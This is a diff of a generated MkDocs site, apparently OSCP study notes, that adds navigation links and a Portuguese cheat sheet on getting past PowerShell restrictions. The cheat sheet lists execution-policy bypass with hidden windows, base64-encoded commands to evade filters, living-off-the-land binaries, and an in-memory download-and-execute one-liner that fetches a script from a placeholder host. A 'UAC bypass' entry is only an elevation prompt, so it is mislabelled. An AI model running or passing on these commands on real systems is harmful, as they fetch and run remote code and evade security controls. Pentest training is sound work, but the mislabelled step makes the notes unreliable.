@@ -71,6 +71,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#powershell-erros" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -3094,6 +3099,10 @@
       
         
       
+        
+      
+        
+      
     
     
       
@@ -3152,6 +3161,50 @@
   
   <span class="md-ellipsis">
     Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../oscp_tips/brute-force/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Brute Force
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../oscp_tips/credentials/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Credentials
     
   </span>
   
@@ -3381,6 +3434,18 @@
       
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    About
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -3391,6 +3456,32 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#powershell-erros" class="md-nav__link">
+    <span class="md-ellipsis">
+      POWERSHELL ERROS
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -3417,7 +3508,50 @@
 
   <h1>About</h1>
 
+<h2 id="powershell-erros">POWERSHELL ERROS</h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># Erro comum:</span>
+<span class="c1"># &#39;powershell&#39; is not recognized as an internal or external command</span>
 
+<span class="c1"># ✔️ Caminho absoluto do PowerShell:</span>
+C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\W</span>indowsPowerShell<span class="se">\v</span><span class="m">1</span>.0<span class="se">\p</span>owershell.exe
+%SystemRoot%<span class="se">\S</span>ystem32<span class="se">\W</span>indowsPowerShell<span class="se">\v</span><span class="m">1</span>.0<span class="se">\p</span>owershell.exe
+
+<span class="c1"># Técnicas para contornar restrições:</span>
+
+<span class="c1"># 1. Usar caminho absoluto</span>
+C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\W</span>indowsPowerShell<span class="se">\v</span><span class="m">1</span>.0<span class="se">\p</span>owershell.exe<span class="w"> </span>-exec<span class="w"> </span>bypass
+
+<span class="c1"># 2. Utilizar variável de ambiente (mais genérico)</span>
+%SystemRoot%<span class="se">\S</span>ystem32<span class="se">\W</span>indowsPowerShell<span class="se">\v</span><span class="m">1</span>.0<span class="se">\p</span>owershell.exe<span class="w"> </span>-exec<span class="w"> </span>bypass
+
+<span class="c1"># 3. Forçar execução sem política restritiva</span>
+powershell.exe<span class="w"> </span>-exec<span class="w"> </span>bypass<span class="w"> </span>-nop<span class="w"> </span>-w<span class="w"> </span>hidden<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;comando&quot;</span>
+
+<span class="c1"># 4. Encodar o comando para evitar filtros</span>
+<span class="c1"># Exemplo: comando simples</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>iconv<span class="w"> </span>-f<span class="w"> </span>ascii<span class="w"> </span>-t<span class="w"> </span>utf-16le<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64
+
+<span class="c1"># Executar via PowerShell</span>
+powershell.exe<span class="w"> </span>-enc<span class="w"> </span>&lt;comando_base64&gt;
+
+<span class="c1"># 5. Usar alternativa ao PowerShell:</span>
+<span class="c1"># Caso esteja desativado ou bloqueado:</span>
+cmd.exe
+wmic
+mshta
+certutil
+regsvr32
+rundll32
+
+<span class="c1"># 6. Bypass UAC (se contexto permitir)</span>
+powershell<span class="w"> </span>-Command<span class="w"> </span><span class="s2">&quot;Start-Process powershell -Verb runAs&quot;</span>
+
+<span class="c1"># 7. PowerShell In-Memory Download &amp; Exec (Living off the Land)</span>
+powershell<span class="w"> </span>-nop<span class="w"> </span>-w<span class="w"> </span>hidden<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://IP/script.ps1&#39;)&quot;</span>
+
+<span class="c1"># 8. Verificar se PowerShell está instalado e disponível</span>
+dir<span class="w"> </span><span class="s2">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span>
+</code></pre></div>
 
 
 
